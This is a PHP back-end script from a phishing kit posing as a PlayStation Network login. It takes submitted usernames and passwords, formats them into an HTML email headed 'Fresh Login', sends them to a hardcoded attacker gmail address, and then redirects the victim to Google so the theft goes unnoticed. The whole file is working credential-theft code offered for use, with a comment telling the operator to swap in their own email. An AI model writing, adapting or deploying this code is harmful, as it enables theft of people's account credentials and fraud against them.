<?php

$emailkamu = "zummian@gmail.com"; //ganti emailnya ente

$email = $_POST['j_username'];

$pass = $_POST['j_password'];




$subject = "PSN ACCOUNT BY ['.$email.'] ";

$message = '

<center> 

<div style="padding:5px;width:294;height:20px;background:#f74d01;color:#ffc;text-align:center;">

<marquee direction="right"><font size=5><b>[+] Fresh Login [+]</b></font> </marquee>

</div>

<table style="border-collapse:collapse;background:#ffc" width="100%" border="1">

 <tr>

  <th style="width:22%;" height="25px"><b>EMAIL ADDRESS</th>

  <th style="width:78%;text-align:center;"><b>'.$email.'</th> 

 </tr>

 

 <tr>

  <th style="width:22%;" height="25px"><b>PASSWORD</th>

  <th style="width:78%;text-align:center;"><b>'.$pass.'</th> 

 </tr>


</table>

<div style="padding:5px;width:294;height:20px;background:black;color:#ffc;text-align:center;">

<font size=5><b>[+] PS NETWORK [+]</b></font>

</div>

</center>

';



$headersx  = 'MIME-Version: 1.0' . "\r\n";

$headersx .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";

$headersx .= 'From: RAFLIPEDIA <raflipedia@tamvan.com>' . "\r\n";

$datamail = mail($emailkamu, $subject, $message, $headersx);

header("Location: https://google.com"); die();
?>